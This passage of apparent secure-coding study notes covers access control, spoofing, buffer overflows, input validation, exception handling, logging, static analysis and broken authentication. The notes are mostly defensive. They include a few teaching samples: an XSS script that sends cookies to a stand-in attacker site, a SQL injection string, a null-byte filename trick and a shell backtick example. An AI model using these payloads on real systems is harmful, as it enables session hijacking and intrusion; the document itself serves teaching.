  - Users are shown an "Edit Account" button. Hidden: a "Delete Account" function exists at the backend.
  - If the server doesn't check auth for the delete function, any user can delete ANY account by crafting the right request.

#### BFLA (Broken Function Level Authorization)
- Complex access control rules w/ different hierarchies/groups/roles and **unclear separation of admin vs. regular functions**.
- Attackers gain access to admin functions by tampering with API calls.
- Example: A regular user's API call returns limited data. By tampering with the API call, they trigger an admin endpoint and get all user data.

---

### Remediation for BAC

**Authorization Security Principles (from Ch.6, Slides 45–46):**

1. **Do NOT rely on obfuscation** — hiding a page URL is not security. Attackers will find it.
2. **Deny Access by Default** — if no explicit permission is set, access is DENIED.
3. **Single App-Wide Mechanism** — use one consistent access control check for all modules.
4. **Continuously Audit and Test** access controls.
5. **Minimize CORS usage** — a web page should only talk to the same domain it was loaded from (Same-Origin Policy).
6. **Disable Web Server Directory Listing** — don't let attackers see folder contents.
7. **Log & Alert** — record access attempts and alert on suspicious activity.
8. **Rate Limit APIs** — limit how many requests can be made in a given time.
9. **Force ALL requests through access control checks.**
10. **Least Privilege:** Give users only the minimum access necessary.

---

## 3.6.1 — Spoofing (BAC-Related Attack)

### What Is Spoofing?
> **Simple:** A cyber criminal **fakes their identity** — pretending to be a trusted email address, website, or IP — to trick a user or system into believing they are a legitimate source.

- Falsifying info that appears to come from a trustworthy source.
- Can include falsifying: **email addresses, IP addresses, or websites**.
- Goal: gain access to sensitive info OR trick individuals into taking a specific action (like clicking a link, sending money, providing credentials).

### Types of Spoofing (Ch.6, Slide 28):

| Type | What Gets Faked | Simple Example |
|------|----------------|----------------|
| **Email Spoofing** | Sender's email address | Email looks like it's from your bank or boss |
| **IP Spoofing** | Source IP address | Attacker makes traffic appear to come from a trusted server |
| **Website Spoofing** | A fake site that looks like a real one | Fake login page for your email provider |
| **DNS Spoofing** | Domain-name-to-IP mapping | Redirects users to attacker's site when they type a legitimate URL |

---

### Spoofing vs. Phishing — Key Difference (Ch.6, Slide 29):

| | Spoofing | Phishing |
|--|---------|---------|
| **Nature** | **Technical impersonation** — faking an identity/source | **Social engineering** — tricking a person to give info |
| **Who is deceived** | Can target machines AND people | Primarily targets people |
| **Method** | Forging headers, IPs, DNS, certificates | Fake emails/sites designed to harvest credentials |
| **Can they overlap?** | Yes — phishing often USES spoofing (fake email address) as part of the attack | Yes — spoofed websites are used to deliver phishing |
| **Example** | Email from "admin@yourbank.com" sent by attacker | Email asking you to click a link and "verify your account" |

> **Key Link:** Spoofing is a *tool* that enables phishing. Phishing is the *goal* (stealing credentials). Spoofing makes phishing more convincing.

---

## 3.7 — Buffer Overflows (BO)

### What Is a Buffer Overflow?
> **Simple:** Imagine a glass that holds 20ml of water. You pour in 50ml. The extra water spills everywhere and damages what's around it. A BO is the same — you write more data than a container (buffer) can hold, and it damages other parts of the computer's memory.

- A **buffer** is a fixed-size block of memory used to store data (input strings, arrays, temp variables).
- When data **exceeds the buffer's capacity**, it "overflows" into adjacent memory.
- This can overwrite **valid data or program control information** (like return addresses — where the program should go next).
- Result: Software crashes, data corruption, or — most critically — **attackers can execute malicious code**.

---

### Code-Level Indicators (Dangerous vs. Safe)

#### Problem 1 — `scanf` without size limit (C):
```c
// DANGEROUS:
char name[20];
scanf("%s", name);  // No limit — reads forever

// SAFE:
char name[20];
scanf("%19s", name);  // Read max 19 chars (1 space for null terminator)
```

#### Problem 2 — `strcpy` without size check (C):
```c
// DANGEROUS:
char buf[5];
char userInput[] = "Hello";
strcpy(buf, userInput);  // No boundary check!

// SAFE:
char buf[5];
strncpy(buf, userInput, sizeof(buf) - 1);
buf[sizeof(buf) - 1] = '\0';  // Ensure null terminator
```

#### Why Python is Safer:
- Python **automatically** creates strings of the right size.
- Python **automatically** adds end-of-string markers.
- Python **automatically** resizes as needed.
- Python **automatically** frees memory when done (garbage collection).
- → No manual memory management = far fewer BO opportunities.

---

### Factors That Cause Buffer Problems (Ch.5, Slide 9)

| Factor | What Goes Wrong |
|--------|----------------|
| No Input Validation | Input not checked for length before storing |
| Unsafe Functions | `gets`, `strcpy` don't check boundaries |
| C/C++ Languages | Allow direct memory access w/ no auto-check |
| Legacy Code | Old apps lack modern secure coding standards |
| Complex Software | More modules/APIs = more insecure input paths |
| Insufficient Testing | Weak testing misses overflow edge cases |
| Mismanaged Dynamic Memory | Bad heap allocation/freeing → overflow |

---

### Real-World Impact of BOs

| Impact | What Happens |
|--------|-------------|
| **DoS (Denial of Service)** | App crashes → service goes down |
| **Data Leakage** | Memory beyond the buffer may expose passwords, keys, sensitive data |
| **Arbitrary Code Execution** | Overwritten return addresses let attackers run any code they want |
| **Privilege Escalation** | If the vulnerable app runs as admin/root, attacker gets full system control |

---

### Prevention: System & Compiler Level

| Protection | How It Works | Simple Explanation |
|-----------|-------------|-------------------|
| **Stack Canaries** | Special "guard" values placed next to return addresses | If the overflow reaches the guard value, the program knows and aborts immediately |
| **ASLR** (Address Space Layout Randomization) | Randomizes where stack, heap, and libraries live in memory | Attacker can't predict *where* to aim their attack |
| **DEP / NX Bit** (Data Execution Prevention) | Memory regions (stack/heap) are marked as non-executable | Even if attacker injects code into the buffer, the CPU refuses to run it |
| **Runtime Protection Libraries** (libsafe, StackGuard) | Detect or stop unsafe function calls at runtime | StackGuard is built into GCC; libsafe wraps dangerous libc functions |

### Prevention: Process Level

| Practice | Benefit |
|---------|---------|
| S-SDLC | Security built-in from the start, not bolted on |
| Static & Dynamic Analysis | Static tools find risky patterns before run; fuzzing exposes vulns at runtime |
| Regular Code Reviews | Peer reviews catch insecure practices early |
| Developer Training | Prevents reintroduction of insecure patterns |

---

## 3.8 — Sensitive Data Exposure Prevention (Ch.3, Slide 28)

> **Simple:** Don't collect data you don't need, and lock down everything you do keep.

This section extends the input handling chapter to cover what happens to data AFTER it enters the system.

### Key Rules:

**1. Don't Store What You Don't Need:**
- Don't store ANY sensitive info that is not *required* for your app to function.
- Why? Data you don't have = data that can't be stolen.

**2. Classify Your Data First:**
- Identify which data is processed, stored, or transmitted by your app.
- Determine sensitivity level: public → internal → confidential → restricted.
- Apply protection based on sensitivity (privacy laws, business needs, regulations like PCI DSS, GDPR).

**3. Encrypt ALL Sensitive Stored Data:**
- Any sensitive data that must be stored must be encrypted.
- Use **strong, up-to-date algorithms, protocols, and keys**.
- Never store passwords in plain text — always hash w/ bcrypt or Argon2.
- Never store raw credit card numbers — use tokenization or encryption.

**4. Encrypt Data In Transit:**
- Use **TLS (Transport Layer Security)** for all data transmitted over networks.
- No HTTP — always HTTPS.

**5. Minimize Exposure:**
- Truncate or mask sensitive data when displayed (e.g., show only last 4 digits of card: `**** **** **** 1234`).
- Limit who can see/access sensitive fields through strict access controls.

> **Bottom Line from Ch.3:** Handling input securely is step 1. Handling the data that comes IN securely through its full lifecycle (storage, transmission, display) is step 2. Both are required.

---

---

# SECTION 4: DEFENSIVE CODING

## 4.1 — Input Classification (Before Validation)

Before processing ANY input, classify it:

| Type | Source | Trust Level |
|------|--------|------------|
| **Trusted Input** | Internal systems or trusted users | Higher trust — but still validate! |
| **Untrusted Input** | User input from web, external systems, unknown sources | ZERO trust — always validate |

> **Rule:** Any input that comes from outside your system must be treated as **potentially hostile** until proven otherwise.

---

## 4.2 — Reasons to Validate Input (Ch.3, Slide 5)

1. **Prevent security attacks** — SQLi, XSS, Command Injection, malicious scripts
2. **Protect database integrity** — stop corrupted or malicious data getting in
3. **Ensure data accuracy** — make sure data is what you expect
4. **Prevent system crash** — bad data can break program logic
5. **Maintain system reliability** — keep the system stable

---

## 4.3 — Input Validation Techniques

**Three main methods:**

| Method | What It Does | Simple Analogy |
|--------|-------------|----------------|
| **Input Filtering** | Accept ONLY the good stuff | Bouncer at a door: only specific people get in |
| **Input Sanitization** | Clean what's dirty — transform dangerous characters | Washing vegetables before cooking |
| **Input Normalization** | Make it consistent (same format, casing, encoding) | Converting all measurements to the same unit |

---

## 4.4 — Syntactic Validation (FORMAT Check)

> **Simple:** Check that the input *looks* like what you expect — the right shape, format, and characters.

**What it checks:**
- Is the format correct? (e.g., does the email have an `@` symbol and a valid domain?)
- Are the characters valid? (e.g., no dangerous special characters)
- Is the length acceptable?

**Email example — what to check syntactically:**
- Contains `@` symbol ✓
- Ends w/ valid TLD (`.com`, `.net`, `.org`) ✓
- Domain part contains only letters, numbers, hyphens, periods ✓
- Local part (before @) ≤ 63 characters ✓
- Total length ≤ 254 characters ✓

**Dangerous characters to BLOCK (from Ch.3, Slide 8):**

| Character | Symbol | Why Dangerous |
|-----------|--------|--------------|
| Backticks | ` `` ` | In Linux/Unix shells → run arbitrary commands |
| Single quotes | `'` | In SQL → break out of strings → SQLi |
| Double quotes | `"` | In HTML attributes → XSS / SQLi |
| Null bytes | `\0` | In C/C++ → tricks program into thinking string ended early → path manipulation |

**Examples of how these are exploited:**
- Backticks in shell: `` echo `ls` `` → runs `ls` and replaces backticks with the output.
- Single quote in SQL: Input `alice' OR '1'='1` → breaks out of SQL string.
- Null byte: Input `evil.php\0.jpg` → program thinks filename is `evil.php`, ignores `.jpg` suffix.

---

## 4.5 — Semantic Validation (MEANING Check)

> **Simple:** Check that the input *makes sense* in the context of your application — even if the format is technically correct.

**What it checks:**
- Does the value make logical sense?
- Is it within an acceptable range for this app?
- Does it match a real-world truth?

**Age example:** Input `age = 5` might be *syntactically valid* (it's a number) but *semantically invalid* if your app requires users to be between 18–100 years old.

**Email ownership example (from Ch.3, Slides 10–12):**
- Syntactic: Email format is correct. ✓
- Semantic: Does the user actually own this email? → Send a **verification link** to the email. If they click it, ownership is confirmed.
- Verification link must be:
  - At least 32 characters long.
  - Time-limited (e.g., expires after 8 hours).
- After verifying email ownership → user still must authenticate normally through the app.

**What Semantic Validation Provides (3 assurances):**
1. The email address is *correct*.
2. The app can successfully *send emails* to it.
3. The user has *access to the mailbox*.

> **Key Point:** Syntactic validation catches *format* errors. Semantic validation catches data that is technically correct but *meaningless or dishonest* in the context of the application.

---

## 4.6 — Recommended Input Validation Strategy (from Ch.3, Slide 9)

For any complex input (like email):
1. **Step 1 — Syntactic check first:** Do basic format validation.
2. **Step 2 — Semantic check second:** Pass to the mail server; catch the exception if it rejects it.

This two-step approach gives maximum confidence that the input is both *correctly formatted* AND *meaningfully valid*.

---

## 4.7 — Prevention Measures: Handling Input Securely

| Measure | What It Does |
|---------|-------------|
| **Input Encoding** | Convert input to safe format (e.g., HTML encoding) → prevents SQLi & XSS |
| **Prepared Statements / Parameterized Queries** | Stop SQLi — input treated as text, never as SQL code |
| **Check for Buffer Overflows** | Reject any input larger than the allocated buffer size |
| **Access Controls & Privilege Management** | Limit what input-based attacks can actually damage |
| **Hide DB Errors** | Never show raw error messages → attackers learn from them |
| **WAF (Web App Firewall)** | Filter malicious requests before they reach your code |
| **Keep software updated** | PHP, Python, MySQL — patch known vulns |

---

## 4.8 — Exception Handling

### What Are Exceptions?
> **Simple:** An exception is an unexpected event that interrupts your program. Exception handling is the way your program deals with those interruptions without crashing.

- Unlike return codes, exceptions allow **separating normal logic from error-handling logic**.
- Used in: Java, Python, C#, C++.
- Essential for preventing: crashes, resource leaks, and accidental info disclosure.

### How Exception Handling Works:
```
Normal code runs →
If something unexpected happens →
Control transfers to a "catch" block →
Error is handled gracefully →
Program continues (or exits cleanly)
```

---

### Main Categories of Exceptions

#### 1. Checked Exceptions
- **Must be handled at compile time** (Java forces you to handle them before the program even runs).
- Examples: `IOException`, `SQLException`
- **Purpose:** Force devs to anticipate *recoverable* errors.
- **Security Role:** Encourages safe coding — e.g., validating file access, handling network errors.

#### 2. Unchecked Exceptions (Runtime Exceptions)
- **Occur during program execution** — compiler doesn't force you to handle them.
- Examples: `NullPointerException`, `ArrayIndexOutOfBoundsException`
- **Cause:** Usually programming errors.
- **Security Concern:** Attackers can exploit unhandled runtime exceptions to **crash apps (DoS)**.

#### 3. System Exceptions (Fatal Errors)
- Related to the **runtime environment or system resources** running out.
- Examples: `OutOfMemoryError`, `StackOverflowError`
- **Cause:** Resource exhaustion, infinite loops (recursion without stopping), memory leaks.
- **Security Concern:** Attackers may deliberately consume resources → **DoS attack** — system crashes instantly.

#### 4. Application-Defined Exceptions
- **Custom exceptions** created for specific business or security rules.
- Example: A custom `PaymentFailedException` or `UnauthorizedAccessException` for your app's logic.

#### Recoverable vs. Non-Recoverable:
- **Recoverable:** File not found — retry is possible.
- **Non-Recoverable:** Memory corruption — cannot proceed safely; must shut down.

#### Security Implications of Exception Classification (Ch.7, Slide 25):

| Exception Type | Security Implication | Required Action |
|---------------|---------------------|----------------|
| **Checked** | Encourage defensive coding | Handle at compile time; validates file access, network errors |
| **Unchecked** | Need secure programming practices | Avoid w/ careful coding; attackers exploit unhandled ones for DoS |
| **System (Fatal)** | Must implement **fail-safe defaults** | Safe shutdown + logging when system resources fail; never leave system in unknown/unsafe state |

---

### Security Risks of POOR Exception Handling

| Risk | What Goes Wrong |
|------|----------------|
| **Unhandled Exceptions** | Program crashes → DoS |
| **Generic catch blocks** (`catch (Exception e)`) | Hides real issues, masks attacks |
| **Information Disclosure** | Detailed exception messages show attackers system internals |
| **Silent Failures** | Catching errors but doing nothing → attacks go unnoticed |

---

### Best Practices for Secure Exception Handling

1. **Catch specific exception types** — don't use a blanket `catch (Exception e)` alone.
2. **Never expose internal details to users** — show a friendly message; log the real error for admins only.
3. **Always release resources** — use `finally` blocks or language equivalents.
4. **Log securely** — record detailed info for admins but never show it to users.
5. **Fail safely** — if something goes wrong, the system should go into a safe state, not an insecure one.

### Secure Exception Handling Example (Python):
```python
try:
    with open("data.txt", "r") as file:  # 'with' ensures file auto-closes (prevents resource leak)
        data = file.read()
except FileNotFoundError:
    print("File not found.")  # User-friendly message, no system details
except PermissionError:
    print("Access denied.")
except Exception as e:
    # Log details for admin — DO NOT show to user
    log(e)
    print("An error occurred.")
finally:
    print("Done.")  # Always runs, even if error occurred — for cleanup
```

---

### Resource Leak Prevention

> **Simple:** A resource leak is when your program "forgets" to return resources it borrowed (like files, network connections, memory). If this keeps happening, the system runs out of resources and crashes or stops working.

**Definition:** Resource leak = program acquires a resource (memory, file handle, socket, DB connection) but **fails to release it properly**.

**Why it matters for security:** Attackers can **deliberately trigger resource leaks** to cause a DoS attack — exhausting system resources until the app crashes.

> ⚠️ A resource leak does **NOT** leak confidential data — it leaks **system resources**, affecting **Availability**.

**Example of Resource Leak (C):**
```c
// BAD — file opened but never closed:
void readFile() {
    FILE *f = fopen("data.txt", "r");
    // ... use file ...
    // fclose(f); <-- MISSING! Each call leaks a file handle.
}

// SAFE — always close the file:
fclose(f);  // Closes and frees the resource
```

**Example (Python — using `with` statement):**
```python
# BAD — file never closed:
file = open("data.txt")
# file is never closed

# SAFE — 'with' auto-closes when block ends:
with open("data.txt") as file:
    data = file.read()
# File automatically closed here, even if an error occurred
```

**Java — try-with-resources:**
```java
// Java automatically closes 'reader' when try block ends
// No need for a finally block to manually close
try (BufferedReader reader = new BufferedReader(new FileReader("data.txt"))) {
    String line = reader.readLine();
}
```

---

## 4.9 — Return Codes

### What Are Return Codes?
> **Simple:** After a function runs, it gives back a number to signal "did it work?" A return code of 0 usually means success; anything else signals a type of problem.

- Widely used in **C, C++, and system-level code**.
- Instead of stopping execution, a function signals an error by returning a special value.
- The **calling function** is responsible for checking and handling the code.

### Common Return Values:
```
0     → Success
-1    → Failure
NULL  → Invalid pointer / Resource not available
```

### Three Categories of Return Codes (Ch.7, Slide 5):

| Category | When Used | Examples |
|---------|-----------|---------|
| **(1) Programmer-defined** | You create your own codes for your app's logic | `0 = success`, `1 = invalid input`, `2 = DB error` |
| **(2) HTTP Status Codes** | When connecting to web servers/APIs | `200 OK`, `404 Not Found`, `500 Internal Server Error` |
| **(3) OS-level codes** | Linux/UNIX system calls | `ENOENT` (file not found), `EACCES` (permission denied) |

### Advantages of Return Codes:
- Simple and efficient (especially in low-level/embedded systems).
- No need for advanced exception mechanisms.
- Predictable behavior in embedded/OS programming.

### Security Concerns w/ Return Codes:

| Concern | Explanation |
|---------|-------------|
| **Ignored return values** | Devs forget to check the code → leads to vulns |
| **Ambiguity** | Different functions use inconsistent codes — confusion leads to bugs |
| **Information leakage** | Too-detailed codes help attackers infer system internals |
| **Propagation complexity** | Errors must be manually passed up through every function call |

### Best Practices for Secure Return Code Use:
1. **Always check return values** before using results.
2. **Standardize codes** — use constants like `EXIT_SUCCESS`, `EXIT_FAILURE`.
3. **Document return values clearly** so other devs know what each means.
4. **Avoid exposing sensitive details** in error codes returned to users.
5. **Combine w/ logging** for better debugging and monitoring.

### Return Codes vs. Exceptions (Ch.7, Slide 19):

| | Return Codes | Exceptions |
|--|-------------|-----------|
| **Style** | Old-school (C/C++, system programming) | Modern (Java, Python, C#) |
| **Check required?** | Dev must manually check each time | Auto-caught if unhandled |
| **Code clarity** | Mixes error logic w/ normal logic | Separates error handling cleanly |
| **Risk if ignored** | Bug or security hole | Unhandled exception crashes app |
| **Best for** | Embedded/OS/low-level systems | App-level, high-level code |

> **Golden Rule (from Ch.7, Slide 42):** "Never expose internal error details to users; log securely for administrators."

---

---

---

---

---

# SECTION 4.10 — LOGGING & DEBUGGING (Chapter 7 — Additional Detail)

## What Is Logging?
> **Simple:** Your program **writes a diary entry** every time something important happens — login attempt, error, file access, etc. Admins can read this diary later.

- **Logging** = recording events, errors, and system activities for later analysis.
- **Debugging** = identifying, analyzing, and fixing bugs in software.
- Together, they support: **incident response, auditing, and forensics**.

**Why They Matter for Security (Ch.7, Slide 34):**
- Logging provides **visibility** into system behavior — you can't defend what you can't see.
- Debugging ensures errors are fixed **systematically** — not guessed at.

---

## Types of Logs (Ch.7, Slide 36):

| Log Type | What It Records |
|---------|----------------|
| **Application Logs** | App-level events (login attempts, errors, data changes) |
| **Security Logs** | Auth events, access control decisions, privilege use |
| **System/OS Logs** | OS-level events, process starts, resource use |
| **Audit Logs** | Who did what, when — for compliance/forensics |
| **Error Logs** | Exceptions, crashes, unhandled errors |

---

## Security Risks of Logging (Ch.7, Slide 37):

| Risk | What Goes Wrong |
|------|----------------|
| **Sensitive data in logs** | Logging passwords, credit cards, or session IDs accidentally → exposed if log is stolen |
| **Log injection** | Attacker types special characters that corrupt log entries (e.g., inserting fake log lines) |
| **Insufficient logging** | Not logging enough → attacks go undetected |
| **Log tampering** | If logs are not protected, attackers delete/alter them to hide their tracks |
| **Info disclosure** | Logs shown to users or publicly accessible → leak internal system details |

---

## Secure Logging Best Practices (Ch.7, Slide 38):

1. **Log what matters** — auth events, errors, access control decisions, admin actions.
2. **Never log sensitive data** — no passwords, PINs, credit card numbers, session tokens.
3. **Protect logs** — restrict access so only authorized admins can read or modify them.
4. **Log to a separate, secure server** — so attackers who compromise the app can't also erase logs.
5. **Sanitize inputs before logging** — prevent log injection attacks.
6. **Include enough context** — timestamp, user ID, IP address, action, outcome.

---

## Purpose of Debugging (Ch.7, Slide 39):
- Find and fix errors before they become vulns.
- Understand how the program actually behaves (vs. how you thought it would).

## Debugging Techniques (Ch.7, Slide 40):
- **Breakpoints** — pause program at a specific line; inspect variables.
- **Step-through** — run code one line at a time.
- **Print/Log statements** — output variable values at key points.
- **Debugger tools** — IDE-integrated debuggers (VS Code, IntelliJ, gdb for C/C++).

## Security Risks & Practices in Debugging (Ch.7, Slide 41):

| Risk | Practice |
|------|---------|
| Debug mode left on in production | **Always turn off debug mode** before deploying — it can expose stack traces and internal info |
| Debug output shown to users | Show generic messages to users; send detailed debug info to **logs only** |
| Hardcoded test credentials | **Remove all debug/test accounts** before deployment |
| Debug endpoints left accessible | Close all debug endpoints in production |

> **Golden Rule (Summary from Ch.7, Slide 42):** Return codes are simple but error-prone if unchecked. Exceptions provide structured error handling, but must be managed carefully. **Never expose internal error details to users; log securely for administrators.**


---

---

# SECTION 5: TOOLS & TECHNIQUES — STATIC ANALYSIS

## 5.1 — What Is Static Analysis?

> **Simple:** Reading the code and finding problems — without ever actually *running* the code.

- **Static Analysis** = analyzing software **without executing it**.
- Used to identify potential errors, weaknesses, or vuln patterns in source code.
- Can detect sec issues **early in dev**, before code is deployed in production.
- By identifying potential vulns **before** they can be exploited by attackers.

**Purposes of Static Analysis:**
- Find security vulnerabilities
- Improve code quality
- Ensure compliance w/ coding standards

---

## 5.2 — Key Analysis Models / Techniques

Static analysis frameworks use different models to examine code:

### A) Data Flow Analysis
- Traces how **data moves** through the program.
- **Best for:** Finding injection attacks (SQLi, XSS) — tracks where untrusted input goes and whether it's checked before use.

### B) Control Flow Analysis (CFA)
- Maps all **possible execution paths** through the code.
- **Best for:** Identifying unreachable code, potential deadlocks, logic errors.

### C) Abstract Syntax Trees (AST)
- Represents code as a **tree structure** showing its syntax and grammar.
- **Best for:** Identifying syntax errors and enforcing coding standards.
- Example from Ch.4, Slide 14:
```
Program
│
├── FunctionDef: calculate_total(price, quantity)
│   ├── Assign: subtotal = price * quantity
│   ├── If (subtotal > 100)
│   │   ├── True Block: Assign: discount = subtotal * 0.10
│   │   └── Else Block: Assign: discount = 0
│   ├── Assign: total = subtotal - discount
│   └── Return total
│
├── Assign: bill = calculate_total(50, 3)
└── print(bill)
```
The AST shows the exact structure of the code — a tool can read this tree to find issues.

---

## 5.3 — Static Analysis Tools (Frameworks)

| Tool | Type | Key Features | Common Industries |
|------|------|-------------|------------------|
| **SonarQube** | Open-source | Dashboard for tracking code quality & sec issues; supports wide range of languages; integrates w/ many dev tools | General |
| **Coverity** | Commercial | Analyzes C, C++, Java, and others; deep defect detection | Aerospace, defense, automotive |
| **Checkmarx** | Commercial | Analyzes 20+ programming languages (Java, .NET, PHP); compliance-focused | Finance, healthcare, government |
| **Semgrep** | Free/Commercial | Find bugs, sec vulns, and code quality issues; 30+ languages including Python; highly customizable rules | General / Modern DevOps |

---

## 5.4 — How Static Analysis Frameworks Work

1. **Algorithms & Rules** — Each framework uses specific rules designed to catch certain types of errors.
2. **Analysis** — The tool scans code against these rules using the models (Data Flow, CFA, AST).
3. **Results Reporting** — Results are reported in formats including:
   - Graphical representations
   - Lists
   - Detailed reports

**Examples of Static Analysis Rules:**
- **Buffer overflow detection** — flags code patterns likely to cause BO.
- **SQLi detection** — flags code where user input is directly concatenated into SQL.
- **XSS detection** — flags code where user input is directly echoed to the browser.
- **Memory leak detection** — flags resources that are never released.
- **Code complexity analysis** — flags code that is too complex and hard to maintain (prone to hidden bugs).

---

## 5.5 — Benefits of Static Analysis

- Detects security issues **early** — before deployment.
- Improves **code quality and maintainability**.
- Detects issues **difficult to find** using other testing methods.
- Leads to **faster development** and lower risk of sec incidents.

---

## 5.6 — Limitations of Static Analysis (IMPORTANT — Don't Ignore These)

| Limitation | Explanation |
|-----------|-------------|
| **False Positives** | Tool flags code as vulnerable when it's actually safe → wastes dev time |
| **False Negatives** | Tool MISSES an actual vulnerability → creates false sense of security |
| **No Runtime Insight** | Cannot detect issues that arise from **runtime behavior** or **system interactions** |
| **Cost** | Some tools are expensive (Coverity, Checkmarx) |
| **Expertise Required** | Some tools require specialized knowledge to use effectively |
| **Integration Effort** | Needs to connect to dev environments, CI/CD pipelines, bug trackers |

> **Conclusion:** Static analysis is a powerful tool, but it should **never be used alone**. Complement it w/:
> - **Dynamic analysis** (testing the *running* code)
> - **Penetration testing** (simulated real attacks)
> - **Code reviews** (human eyes on the code)

---

## 5.7 — Factors to Consider When Selecting a Static Analysis Framework

| Factor | What to Think About |
|--------|-------------------|
| **Cost** | Free (SonarQube, Semgrep) vs. commercial (Coverity, Checkmarx) |
| **Ease of Use** | Does it need specialized expertise? |
| **Language Support** | Does it support YOUR programming language? |
| **Integration** | Does it connect to your IDE, CI/CD pipeline, or bug tracker? |
| **Type of Analysis Needed** | Data flow? Control flow? AST? Pick the right model |
| **Reporting Quality** | Does the output help your team fix issues efficiently? |

---

---

# SECTION 6: BROKEN AUTHENTICATION (Chapter 8 — Additional Detail)

## 6.1 — Auth vs. Authorization

| Concept | Simple Definition | Example |
|---------|-----------------|---------|
| **Authentication (AuthN)** | "Who are you?" — verifying identity | Entering username + password |
| **Authorization (AuthZ)** | "What are you allowed to do?" — permissions | Admin can delete users; regular user cannot |

---

## 6.2 — Authentication Factors

| Factor | Type | Example | Risk |
|--------|------|---------|------|
| **Something you know** | Most common | Password, PIN | Can be guessed or stolen |
| **Something you have** | Physical object | Access card, key fob, OTP device | Can be lost or stolen |
| **Something you are** | Biometric | Fingerprint, iris, voice | Harder to replicate; can be expensive |

---

## 6.3 — What Is Broken Authentication?
> Vulns or weaknesses in a platform that allow hackers to **bypass login security** and gain access to all privileges of the hacked user.

**Two main categories:**

### 1. Session Management Vulns
- A **session ID** is created and assigned to a user when they log in.
- It tracks what the user does across multiple requests.
- If an attacker **steals the session ID** while the user is logged in = attacker effectively has the user's password.
- Attacker impersonates the user completely.

### 2. Credential Management Vulns
- Theft of usernames and passwords.
- Occurs when a site **fails to protect users** from attackers trying to use hacked or stolen passwords.

---

## 6.4 — Broken Auth Attack Types

### Password Spraying
- Attackers try **common/weak passwords** (e.g., `12345`, `password`) against many accounts.
- Relies on users choosing predictable passwords.
- **Defense:** Password complexity requirements.

### Credential Stuffing
- Attackers use **stolen username/password lists** from data breaches on OTHER sites.
- They try these same credentials on your site (people reuse passwords).
- Done via large-scale **automated login requests**.
- **Defense:** Breached password protection, MFA.

### Session Hijacking
- Attacker **steals an active session cookie** and uses it to impersonate the user.
- Also called "cookie hijacking" or "cookie side-jacking."
- Example: XSS used to steal cookies:
```javascript
http://www.TrustedSearchEngine.com/search?
<script>
  location.href='http://www.SecretVillainSite.com/hijacker.php?cookie='+document.cookie;
</script>
```
- Script reads `document.cookie` and sends it to the attacker's server.

### Session ID in URL
- When session ID is **appended to the URL as a parameter**:
  ```
  https://www.example.com/index.php?sid=123454321abcde-54321dcba
  ```
- Problem: URLs are logged in browser history, server logs, referrer headers — attacker can intercept.
- **Defense:** Never put session IDs in URLs. Use cookies w/ HTTPS only.

### Phishing
- Attacker **pretends to be a trusted entity** (bank, email provider) to trick users into giving up credentials.
- Delivered via email, IM, SMS.

---

## 6.5 — How to Fix Broken Authentication (9 Solutions from Ch.8)

| # | Solution | What It Does |
|---|---------|-------------|
| 1 | **Secure Password Storage** | Hash passwords (bcrypt, Argon2), use unique salts, never store plain text |
| 2 | **Don't Allow Weak Passwords** | Require min 8 chars, uppercase, lowercase, numbers, special chars |
| 3 | **Strict Credential Recovery** | Multi-step verification for password resets; lockout after 10 failed attempts |
| 4 | **Breached Password Protection** | Lock accounts where passwords are known to be compromised |
| 5 | **Regulate Session Length** | Auto-expire sessions after inactivity (banking: short; streaming: longer) |
| 6 | **Improve Session Management** | Issue NEW session ID after every successful login; invalidate old ones immediately |
| 7 | **No Session ID URLs** | Never put session IDs in URLs; use HTTPS-only cookies |
| 8 | **MFA (Multi-Factor Auth)** | Require a second factor (OTP sent to phone/email) in addition to password |
| 9 | **User Awareness** | Regular education about phishing risks and strong password practices |

---

### 🔎 Deep Dive: Secure Password Storage — 5 Vulnerability Types (Ch.8, Slides 25–28)

Even the "password storage" step has its own sub-vulns:

| # | Vuln Type | What Goes Wrong | Simple Analogy |
|---|----------|-----------------|---------------|
| a | **Plain-text storage** | Passwords stored as readable text — anyone w/ DB access can read every password | Keeping your diary unlocked |
| b | **Weak hashing algorithm** | Hashing is done but uses old/weak algorithms → vulnerable to brute-force or dictionary attacks | Locking a door with a toy lock |
| c | **Inadequate salt** | Salt = unique random value added to each password before hashing. If salt is not unique/random enough, attackers can pre-compute hash tables to crack passwords | Putting everyone's password in the same colour envelope |
| d | **Vulnerable recovery mechanism** | Email reset links not secured → if attacker controls the email account, they can use the reset link to take over | Leaving a spare key under the doormat |
| e | **Insider attacks** | Employees/contractors with DB access can abuse or leak password data | A trusted worker stealing from the safe |

**Fix:** Use **bcrypt** or **Argon2** (strong, slow hashing algorithms) + unique random salts per user + never store plain text.

---

### 🔎 Deep Dive: Code Example — Enforce Password Rules (Ch.8, Slide 31)

In .NET/C#, you enforce password rules like this:
```csharp
services.Configure<IdentityOptions>(options => {
    options.Password.RequireDigit = true;          // Must have a number
    options.Password.RequiredLength = 8;            // Minimum 8 characters
    options.Password.RequireNonAlphanumeric = true; // Must have special char
    options.Password.RequireUppercase = true;       // At least one uppercase
    options.Password.RequireLowercase = true;       // At least one lowercase
    options.Password.RequiredUniqueChars = 6;       // At least 6 different chars
    options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(30); // Lock 30 min
    options.Lockout.MaxFailedAccessAttempts = 10;   // Lock after 10 fails
    options.SignIn.RequireConfirmedEmail = true;     // Email must be verified
    options.User.RequireUniqueEmail = true;          // No duplicate emails
});
```
- `RequireDigit`, `RequireUppercase`, etc. → forces strong passwords.
- `MaxFailedAccessAttempts = 10` → locks account after 10 wrong attempts = stops password spraying.
- `RequireConfirmedEmail` → makes sure email ownership is verified before allowing login.

---

### 🔎 Deep Dive: Regulate Session Length — Code Example (Ch.8, Slide 35)

In .NET, session length is configured in the app's startup code:
```csharp
builder.Services.AddSession(options => {
    options.IdleTimeout = TimeSpan.FromSeconds(10); // Session expires after 10s of inactivity
    options.Cookie.HttpOnly = true;   // Cookie can't be accessed by JavaScript (blocks XSS theft)
    options.Cookie.IsEssential = true;
});
app.UseSession(); // Must be called to activate session middleware
```
- `IdleTimeout` — controls how long before inactivity kills the session.
- `HttpOnly = true` — critical sec flag: JavaScript (including attacker's XSS scripts) **cannot** read this cookie.
- Actual timeout value: **shorter** for sensitive apps (banking), **longer** for media/streaming.


---

---

---

---

# SECTION 6.6 — BROKEN AUTHENTICATION TESTING TOOLS (Chapter 8)

> These tools help identify broken auth vulns in web apps:

| Tool | Type | Purpose |
|------|------|---------|
| **WebGoat** | Educational | A deliberately insecure web app you practice attacks on safely — like a "training dummy" for web vulns |
